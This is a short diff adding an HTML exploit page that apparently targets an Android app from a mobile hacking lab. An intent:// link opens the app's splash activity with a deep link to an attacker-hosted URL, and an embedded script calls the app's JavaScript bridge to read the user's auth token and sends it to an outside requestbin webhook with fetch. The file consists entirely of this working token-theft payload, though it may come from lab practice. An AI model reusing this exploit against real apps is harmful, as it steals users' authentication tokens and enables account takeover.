@@ -1,0 +1,18 @@
+<html>
+<body>
+<a href="intent://showPage?url=https://10.11.3.2:8443/#Intent;scheme=mhlcrypto;action=android.intent.action.VIEW;component=com.mobilehackinglab.exchange/com.mobilehackinglab.exchange.SplashActivity;package=com.mobilehackinglab.exchange;end">
+  Click me
+</a>
+</body>
+
+
+<script>
+ dsBridge.call("getUserAuth", function(result) {
+    var token = JSON.stringify(result);
+    var webhook = "http://requestbin.whapi.cloud/1d5zjo41";
+    fetch(webhook + encodeURIComponent(token), {mode: 'no-cors'});
+    alert("pwned");
+});
+</script>
+ </html>
+
